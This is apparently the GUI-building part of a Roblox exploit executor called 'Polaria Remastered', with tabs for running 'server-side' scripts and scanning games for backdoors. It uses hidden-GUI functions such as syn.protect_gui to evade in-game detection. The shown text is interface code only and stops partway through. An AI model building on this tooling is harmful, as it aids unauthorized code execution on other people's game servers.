getgenv().PolariaRM = getgenv().PolariaRM or {}

if getgenv().PolariaRM.isLoaded then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Polaria Remastered",
        Text = "Polaria Remastered is already running!",
        Duration = 4
    })
    error("Polaria Remastered is already running", 0)
end

getgenv().PolariaRM.isLoaded = true

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local localPlayer = Players.LocalPlayer
local Stats = game:GetService("Stats")
local CoreGui = game:GetService("CoreGui")

local UI = {};

UI["ScreenGui_1"] = Instance.new("ScreenGui")
UI["ScreenGui_1"]["Name"] = "PRMD"
UI["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
UI["ScreenGui_1"]["ResetOnSpawn"] = false

local parents = {
	gethui,
	get_hidden_gui,
	gethiddengui,
	get_hidden_gui or gethiddengui,
	function() return Players.LocalPlayer:WaitForChild("PlayerGui") end,
	function() return cloneref and cloneref(CoreGui) or CoreGui end,
	function() return CoreGui end
}

for _, f in ipairs(parents) do
	pcall(function()
		local p = type(f) == "function" and f() or f
		if p then
			UI["ScreenGui_1"]["Parent"] = p
			error()
		end
	end)
end

pcall(function()
	if syn and syn.protect_gui then
		syn.protect_gui(UI["ScreenGui_1"])
		UI["ScreenGui_1"]["Parent"] = CoreGui
	end
end)

UI["Show_2"] = Instance.new("TextButton", UI["ScreenGui_1"]);
UI["Show_2"]["TextWrapped"] = true;
UI["Show_2"]["BorderSizePixel"] = 0;
UI["Show_2"]["TextScaled"] = true;
UI["Show_2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Show_2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Show_2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Zekton.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["Show_2"]["Size"] = UDim2.new(0, 38, 0, 40);
UI["Show_2"]["Text"] = "P"
UI["Show_2"]["Name"] = "Show"
UI["Show_2"]["Visible"] = false;
UI["Show_2"]["Position"] = UDim2.new(0, 20, 0, 2);


UI["UICorner_3"] = Instance.new("UICorner", UI["Show_2"]);
UI["UICorner_3"]["CornerRadius"] = UDim.new(0, 99);


UI["UIGradient_4"] = Instance.new("UIGradient", UI["Show_2"]);
UI["UIGradient_4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_5"] = Instance.new("UIStroke", UI["Show_2"]);
UI["UIStroke_5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_5"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_6"] = Instance.new("UIGradient", UI["UIStroke_5"]);
UI["UIGradient_6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["MainFrame_7"] = Instance.new("Frame", UI["ScreenGui_1"]);
UI["MainFrame_7"]["BorderSizePixel"] = 0;
UI["MainFrame_7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["MainFrame_7"]["Size"] = UDim2.new(0, 512, 0, 324);
UI["MainFrame_7"]["Position"] = UDim2.new(0, 20, 0, 2);
UI["MainFrame_7"]["Name"] = "MainFrame"


UI["HomeContent_8"] = Instance.new("Frame", UI["MainFrame_7"]);
UI["HomeContent_8"]["BorderSizePixel"] = 0;
UI["HomeContent_8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["HomeContent_8"]["Size"] = UDim2.new(0, 504, 0, 238);
UI["HomeContent_8"]["Position"] = UDim2.new(0, 4, 0, 82);
UI["HomeContent_8"]["Name"] = "HomeContent"
UI["HomeContent_8"]["BackgroundTransparency"] = 1;


UI["Stats_9"] = Instance.new("TextLabel", UI["HomeContent_8"]);
UI["Stats_9"]["TextWrapped"] = true;
UI["Stats_9"]["BorderSizePixel"] = 0;
UI["Stats_9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["Stats_9"]["TextYAlignment"] = Enum.TextYAlignment.Top;
UI["Stats_9"]["TextScaled"] = true;
UI["Stats_9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Stats_9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["Stats_9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Stats_9"]["BackgroundTransparency"] = 1;
UI["Stats_9"]["Size"] = UDim2.new(0, 410, 0, 184);
UI["Stats_9"]["Text"] = "FPS:\nPing:\nServer age:\nDevice:\nOS:\nExecutor:"
UI["Stats_9"]["Name"] = "Stats"
UI["Stats_9"]["Position"] = UDim2.new(0, 94, 0, 54);


UI["UIGradient_a"] = Instance.new("UIGradient", UI["Stats_9"]);
UI["UIGradient_a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["WelcomeLabel_b"] = Instance.new("TextLabel", UI["HomeContent_8"]);
UI["WelcomeLabel_b"]["TextWrapped"] = true;
UI["WelcomeLabel_b"]["BorderSizePixel"] = 0;
UI["WelcomeLabel_b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["WelcomeLabel_b"]["TextScaled"] = true;
UI["WelcomeLabel_b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["WelcomeLabel_b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["WelcomeLabel_b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["WelcomeLabel_b"]["BackgroundTransparency"] = 1;
UI["WelcomeLabel_b"]["Size"] = UDim2.new(0, 410, 0, 50);
UI["WelcomeLabel_b"]["Text"] = "Welcome to Polaria Remastered, DisplayName!"
UI["WelcomeLabel_b"]["Name"] = "WelcomeLabel"
UI["WelcomeLabel_b"]["Position"] = UDim2.new(0, 94, 0, 0);


UI["UIGradient_c"] = Instance.new("UIGradient", UI["WelcomeLabel_b"]);
UI["UIGradient_c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UserHeadshot_d"] = Instance.new("ImageLabel", UI["HomeContent_8"]);
UI["UserHeadshot_d"]["BorderSizePixel"] = 0;
UI["UserHeadshot_d"]["ScaleType"] = Enum.ScaleType.Fit;
UI["UserHeadshot_d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["UserHeadshot_d"]["Size"] = UDim2.new(0, 90, 0, 90);
UI["UserHeadshot_d"]["BackgroundTransparency"] = 1;
UI["UserHeadshot_d"]["Name"] = "UserHeadshot"


UI["UICorner_e"] = Instance.new("UICorner", UI["UserHeadshot_d"]);
UI["UICorner_e"]["CornerRadius"] = UDim.new(0, 99);


UI["UIStroke_f"] = Instance.new("UIStroke", UI["UserHeadshot_d"]);
UI["UIStroke_f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_f"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_10"] = Instance.new("UIGradient", UI["UIStroke_f"]);
UI["UIGradient_10"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["ExeContent_11"] = Instance.new("Frame", UI["MainFrame_7"]);
UI["ExeContent_11"]["Visible"] = false;
UI["ExeContent_11"]["BorderSizePixel"] = 0;
UI["ExeContent_11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["ExeContent_11"]["Size"] = UDim2.new(0, 504, 0, 238);
UI["ExeContent_11"]["Position"] = UDim2.new(0, 4, 0, 82);
UI["ExeContent_11"]["Name"] = "ExeContent"
UI["ExeContent_11"]["BackgroundTransparency"] = 1;


UI["Clr_12"] = Instance.new("TextButton", UI["ExeContent_11"]);
UI["Clr_12"]["TextWrapped"] = true;
UI["Clr_12"]["BorderSizePixel"] = 0;
UI["Clr_12"]["TextScaled"] = true;
UI["Clr_12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Clr_12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Clr_12"]["BackgroundTransparency"] = 1;
UI["Clr_12"]["Size"] = UDim2.new(0, 120, 0, 36);
UI["Clr_12"]["Text"] = "Clear"
UI["Clr_12"]["Name"] = "Clr"
UI["Clr_12"]["Position"] = UDim2.new(0, 126, 0, 202);


UI["UICorner_13"] = Instance.new("UICorner", UI["Clr_12"]);
UI["UICorner_13"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_14"] = Instance.new("UIGradient", UI["Clr_12"]);
UI["UIGradient2_14"]["Name"] = "UIGradient2"
UI["UIGradient2_14"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_15"] = Instance.new("UIStroke", UI["Clr_12"]);
UI["UIStroke_15"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_15"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_16"] = Instance.new("UIGradient", UI["UIStroke_15"]);
UI["UIGradient_16"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["Exe_17"] = Instance.new("TextButton", UI["ExeContent_11"]);
UI["Exe_17"]["TextWrapped"] = true;
UI["Exe_17"]["BorderSizePixel"] = 0;
UI["Exe_17"]["TextScaled"] = true;
UI["Exe_17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Exe_17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Exe_17"]["BackgroundTransparency"] = 1;
UI["Exe_17"]["Size"] = UDim2.new(0, 120, 0, 36);
UI["Exe_17"]["Text"] = "Execute"
UI["Exe_17"]["Name"] = "Exe"
UI["Exe_17"]["Position"] = UDim2.new(0, 0, 0, 202);


UI["UICorner_18"] = Instance.new("UICorner", UI["Exe_17"]);
UI["UICorner_18"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_19"] = Instance.new("UIGradient", UI["Exe_17"]);
UI["UIGradient2_19"]["Name"] = "UIGradient2"
UI["UIGradient2_19"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_1a"] = Instance.new("UIStroke", UI["Exe_17"]);
UI["UIStroke_1a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_1a"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_1b"] = Instance.new("UIGradient", UI["UIStroke_1a"]);
UI["UIGradient_1b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["Re_1c"] = Instance.new("TextButton", UI["ExeContent_11"]);
UI["Re_1c"]["TextWrapped"] = true;
UI["Re_1c"]["BorderSizePixel"] = 0;
UI["Re_1c"]["TextScaled"] = true;
UI["Re_1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Re_1c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Re_1c"]["BackgroundTransparency"] = 1;
UI["Re_1c"]["Size"] = UDim2.new(0, 120, 0, 36);
UI["Re_1c"]["Text"] = "Refresh"
UI["Re_1c"]["Name"] = "Re"
UI["Re_1c"]["Position"] = UDim2.new(0, 252, 0, 202);


UI["UICorner_1d"] = Instance.new("UICorner", UI["Re_1c"]);
UI["UICorner_1d"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_1e"] = Instance.new("UIGradient", UI["Re_1c"]);
UI["UIGradient2_1e"]["Name"] = "UIGradient2"
UI["UIGradient2_1e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_1f"] = Instance.new("UIStroke", UI["Re_1c"]);
UI["UIStroke_1f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_1f"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_20"] = Instance.new("UIGradient", UI["UIStroke_1f"]);
UI["UIGradient_20"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["Input_21"] = Instance.new("ScrollingFrame", UI["ExeContent_11"]);
UI["Input_21"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
UI["Input_21"]["BorderSizePixel"] = 0;
UI["Input_21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["Input_21"]["Name"] = "Input"
UI["Input_21"]["Size"] = UDim2.new(0, 507, 0, 200);
UI["Input_21"]["Position"] = UDim2.new(0, -2, 0, -2);
UI["Input_21"]["ScrollBarThickness"] = 0;
UI["Input_21"]["BackgroundTransparency"] = 1;


UI["UIPadding_22"] = Instance.new("UIPadding", UI["Input_21"]);
UI["UIPadding_22"]["PaddingTop"] = UDim.new(0, 2);
UI["UIPadding_22"]["PaddingRight"] = UDim.new(0, 2);
UI["UIPadding_22"]["PaddingLeft"] = UDim.new(0, 2);
UI["UIPadding_22"]["PaddingBottom"] = UDim.new(0, 2);


UI["UIListLayout_23"] = Instance.new("UIListLayout", UI["Input_21"]);
UI["UIListLayout_23"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;


UI["TextBox_24"] = Instance.new("TextBox", UI["Input_21"]);
UI["TextBox_24"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["TextBox_24"]["TextYAlignment"] = Enum.TextYAlignment.Top;
UI["TextBox_24"]["BorderSizePixel"] = 0;
UI["TextBox_24"]["TextWrapped"] = true;
UI["TextBox_24"]["TextSize"] = 18;
UI["TextBox_24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["TextBox_24"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["TextBox_24"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["TextBox_24"]["PlaceholderText"] = "Server-side script here...";
UI["TextBox_24"]["Size"] = UDim2.new(0, 92, 0, 196);
UI["TextBox_24"]["Position"] = UDim2.new(0, 182, 0, 2);
UI["TextBox_24"]["Text"] = "";
UI["TextBox_24"]["BackgroundTransparency"] = 1;
UI["TextBox_24"]["ClearTextOnFocus"] = false;
UI["TextBox_24"]["MultiLine"] = true;
UI["TextBox_24"]["AutomaticSize"] = Enum.AutomaticSize.Y;


UI["UIStroke_25"] = Instance.new("UIStroke", UI["TextBox_24"]);
UI["UIStroke_25"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_25"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_26"] = Instance.new("UIGradient", UI["UIStroke_25"]);
UI["UIGradient_26"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UICorner_27"] = Instance.new("UICorner", UI["TextBox_24"]);
UI["UICorner_27"]["CornerRadius"] = UDim.new(0, 4);


UI["Close_28"] = Instance.new("TextButton", UI["MainFrame_7"]);
UI["Close_28"]["TextWrapped"] = true;
UI["Close_28"]["BorderSizePixel"] = 0;
UI["Close_28"]["TextScaled"] = true;
UI["Close_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Close_28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Close_28"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["Close_28"]["BackgroundTransparency"] = 1;
UI["Close_28"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["Close_28"]["Text"] = "X"
UI["Close_28"]["Name"] = "Close"
UI["Close_28"]["Position"] = UDim2.new(0, 476, 0, 4);


UI["UICorner_29"] = Instance.new("UICorner", UI["Close_28"]);
UI["UICorner_29"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_2a"] = Instance.new("UIGradient", UI["Close_28"]);
UI["UIGradient2_2a"]["Name"] = "UIGradient2"
UI["UIGradient2_2a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};

UI["ScriptsContent_2d"] = Instance.new("ScrollingFrame", UI["MainFrame_7"]);
UI["ScriptsContent_2d"]["Visible"] = false;
UI["ScriptsContent_2d"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
UI["ScriptsContent_2d"]["BorderSizePixel"] = 0;
UI["ScriptsContent_2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["ScriptsContent_2d"]["Name"] = "ScriptsContent"
UI["ScriptsContent_2d"]["Size"] = UDim2.new(0, 512, 0, 242);
UI["ScriptsContent_2d"]["Position"] = UDim2.new(0, 1, 0, 80);
UI["ScriptsContent_2d"]["ScrollBarThickness"] = 0;
UI["ScriptsContent_2d"]["BackgroundTransparency"] = 1;


UI["UIPadding_2e"] = Instance.new("UIPadding", UI["ScriptsContent_2d"]);
UI["UIPadding_2e"]["PaddingTop"] = UDim.new(0, 2);
UI["UIPadding_2e"]["PaddingRight"] = UDim.new(0, 2);
UI["UIPadding_2e"]["PaddingLeft"] = UDim.new(0, 2);
UI["UIPadding_2e"]["PaddingBottom"] = UDim.new(0, 2);


UI["UIGridLayout_2f"] = Instance.new("UIGridLayout", UI["ScriptsContent_2d"]);
UI["UIGridLayout_2f"]["CellSize"] = UDim2.new(0, 97, 0, 34);

UI["ButtonExample_30"] = Instance.new("TextButton", UI["ScriptsContent_2d"]);
UI["ButtonExample_30"]["TextWrapped"] = true;
UI["ButtonExample_30"]["BorderSizePixel"] = 0;
UI["ButtonExample_30"]["TextScaled"] = true;
UI["ButtonExample_30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["ButtonExample_30"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["ButtonExample_30"]["BackgroundTransparency"] = 1;
UI["ButtonExample_30"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["ButtonExample_30"]["Text"] = "Script name"
UI["ButtonExample_30"]["Name"] = "ButtonExample"
UI["ButtonExample_30"]["Position"] = UDim2.new(0, 390, 0, 4);


UI["UICorner_31"] = Instance.new("UICorner", UI["ButtonExample_30"]);
UI["UICorner_31"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_32"] = Instance.new("UIGradient", UI["ButtonExample_30"]);
UI["UIGradient2_32"]["Name"] = "UIGradient2"
UI["UIGradient2_32"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_33"] = Instance.new("UIStroke", UI["ButtonExample_30"]);
UI["UIStroke_33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_33"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_34"] = Instance.new("UIGradient", UI["UIStroke_33"]);
UI["UIGradient_34"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_35"] = Instance.new("UIStroke", UI["MainFrame_7"]);
UI["UIStroke_35"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_35"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_36"] = Instance.new("UIGradient", UI["UIStroke_35"]);
UI["UIGradient_36"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["ScannerContent_37"] = Instance.new("Frame", UI["MainFrame_7"]);
UI["ScannerContent_37"]["Visible"] = false;
UI["ScannerContent_37"]["BorderSizePixel"] = 0;
UI["ScannerContent_37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["ScannerContent_37"]["Size"] = UDim2.new(0, 504, 0, 238);
UI["ScannerContent_37"]["Position"] = UDim2.new(0, 4, 0, 82);
UI["ScannerContent_37"]["Name"] = "ScannerContent"
UI["ScannerContent_37"]["BackgroundTransparency"] = 1;


UI["ScanTab_38"] = Instance.new("TextButton", UI["ScannerContent_37"]);
UI["ScanTab_38"]["TextWrapped"] = true;
UI["ScanTab_38"]["BorderSizePixel"] = 0;
UI["ScanTab_38"]["TextScaled"] = true;
UI["ScanTab_38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["ScanTab_38"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["ScanTab_38"]["BackgroundTransparency"] = 1;
UI["ScanTab_38"]["Size"] = UDim2.new(0, 48, 0, 48);
UI["ScanTab_38"]["LayoutOrder"] = 2;
UI["ScanTab_38"]["Text"] = "Scan"
UI["ScanTab_38"]["Name"] = "ScanTab"
UI["ScanTab_38"]["Position"] = UDim2.new(0, 102, 0, 22);


UI["UICorner_39"] = Instance.new("UICorner", UI["ScanTab_38"]);
UI["UICorner_39"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_3a"] = Instance.new("UIGradient", UI["ScanTab_38"]);
UI["UIGradient2_3a"]["Name"] = "UIGradient2"
UI["UIGradient2_3a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_3b"] = Instance.new("UIStroke", UI["ScanTab_38"]);
UI["UIStroke_3b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_3b"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_3c"] = Instance.new("UIGradient", UI["UIStroke_3b"]);
UI["UIGradient_3c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIListLayout_3d"] = Instance.new("UIListLayout", UI["ScannerContent_37"]);
UI["UIListLayout_3d"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
UI["UIListLayout_3d"]["Padding"] = UDim.new(0, 4);


UI["Status_3e"] = Instance.new("TextLabel", UI["ScannerContent_37"]);
UI["Status_3e"]["TextWrapped"] = true;
UI["Status_3e"]["BorderSizePixel"] = 0;
UI["Status_3e"]["TextSize"] = 22;
UI["Status_3e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["Status_3e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
UI["Status_3e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Status_3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["Status_3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Status_3e"]["BackgroundTransparency"] = 1;
UI["Status_3e"]["Size"] = UDim2.new(0, 456, 0, 184);
UI["Status_3e"]["Text"] = "Ready to scan for backdoors..."
UI["Status_3e"]["Name"] = "Status"
UI["Status_3e"]["Position"] = UDim2.new(0, 0, 0, 54);


UI["UIGradient_3f"] = Instance.new("UIGradient", UI["Status_3e"]);
UI["UIGradient_3f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UICorner_40"] = Instance.new("UICorner", UI["MainFrame_7"]);
UI["UICorner_40"]["CornerRadius"] = UDim.new(0, 4);


UI["Tabs_41"] = Instance.new("Frame", UI["MainFrame_7"]);
UI["Tabs_41"]["BorderSizePixel"] = 0;
UI["Tabs_41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["Tabs_41"]["Size"] = UDim2.new(0, 504, 0, 34);
UI["Tabs_41"]["Position"] = UDim2.new(0, 4, 0, 42);
UI["Tabs_41"]["Name"] = "Tabs"
UI["Tabs_41"]["BackgroundTransparency"] = 1;


UI["ScanTab_42"] = Instance.new("TextButton", UI["Tabs_41"]);
UI["ScanTab_42"]["TextWrapped"] = true;
UI["ScanTab_42"]["BorderSizePixel"] = 0;
UI["ScanTab_42"]["TextScaled"] = true;
UI["ScanTab_42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["ScanTab_42"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["ScanTab_42"]["BackgroundTransparency"] = 1;
UI["ScanTab_42"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["ScanTab_42"]["LayoutOrder"] = 2;
UI["ScanTab_42"]["Text"] = "Scanner"
UI["ScanTab_42"]["Name"] = "ScanTab"
UI["ScanTab_42"]["Position"] = UDim2.new(0, 390, 0, 4);


UI["UICorner_43"] = Instance.new("UICorner", UI["ScanTab_42"]);
UI["UICorner_43"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_44"] = Instance.new("UIGradient", UI["ScanTab_42"]);
UI["UIGradient2_44"]["Name"] = "UIGradient2"
UI["UIGradient2_44"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_45"] = Instance.new("UIStroke", UI["ScanTab_42"]);
UI["UIStroke_45"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_45"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_46"] = Instance.new("UIGradient", UI["UIStroke_45"]);
UI["UIGradient_46"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["ScriptsTab_47"] = Instance.new("TextButton", UI["Tabs_41"]);
UI["ScriptsTab_47"]["TextWrapped"] = true;
UI["ScriptsTab_47"]["BorderSizePixel"] = 0;
UI["ScriptsTab_47"]["TextScaled"] = true;
UI["ScriptsTab_47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["ScriptsTab_47"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["ScriptsTab_47"]["BackgroundTransparency"] = 1;
UI["ScriptsTab_47"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["ScriptsTab_47"]["LayoutOrder"] = 3;
UI["ScriptsTab_47"]["Text"] = "Scripts"
UI["ScriptsTab_47"]["Name"] = "ScriptsTab"
UI["ScriptsTab_47"]["Position"] = UDim2.new(0, 390, 0, 4);


UI["UICorner_48"] = Instance.new("UICorner", UI["ScriptsTab_47"]);
UI["UICorner_48"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_49"] = Instance.new("UIGradient", UI["ScriptsTab_47"]);
UI["UIGradient2_49"]["Name"] = "UIGradient2"
UI["UIGradient2_49"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_4a"] = Instance.new("UIStroke", UI["ScriptsTab_47"]);
UI["UIStroke_4a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_4a"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_4b"] = Instance.new("UIGradient", UI["UIStroke_4a"]);
UI["UIGradient_4b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["HomeTab_4c"] = Instance.new("TextButton", UI["Tabs_41"]);
UI["HomeTab_4c"]["TextWrapped"] = true;
UI["HomeTab_4c"]["BorderSizePixel"] = 0;
UI["HomeTab_4c"]["TextScaled"] = true;
UI["HomeTab_4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["HomeTab_4c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["HomeTab_4c"]["BackgroundTransparency"] = 1;
UI["HomeTab_4c"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["HomeTab_4c"]["LayoutOrder"] = 1;
UI["HomeTab_4c"]["Text"] = "Home"
UI["HomeTab_4c"]["Name"] = "HomeTab"
UI["HomeTab_4c"]["Position"] = UDim2.new(0, 390, 0, 4);


UI["UICorner_4d"] = Instance.new("UICorner", UI["HomeTab_4c"]);
